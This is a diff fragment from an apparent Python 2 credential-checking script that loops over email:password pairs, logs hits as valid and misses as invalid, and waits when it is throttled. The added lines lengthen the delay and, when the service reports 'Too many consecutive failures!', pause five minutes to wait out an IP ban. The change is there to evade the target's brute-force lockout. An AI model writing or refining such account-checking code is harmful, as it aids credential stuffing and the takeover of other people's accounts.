@@ -86,7 +86,12 @@ for line in file:
 				valid.close()
 		else:
 			print '{} {}[+] '.format(rd, rd) + '(' + str(count) + ') ' + email + ':' + password + ' => [ + XINVALID + ]'.format(rd, rd)
-		time.sleep(15)
+		time.sleep(60)
+		if 'Too many consecutive failures!' in src:
+			print '{} {}[+] '.format(gr, gr) + 'WAITING FOR THE BAN IP.'.format(yl, yl)
+			time.sleep(300)
+		else:
+			pass
 	else:
 		print '{} {}[+] '.format(rd, rd) + '(' + str(count) + ') ' + email + ':' + password + ' => [ + INVALID + ]'.format(rd, rd)
 		pass
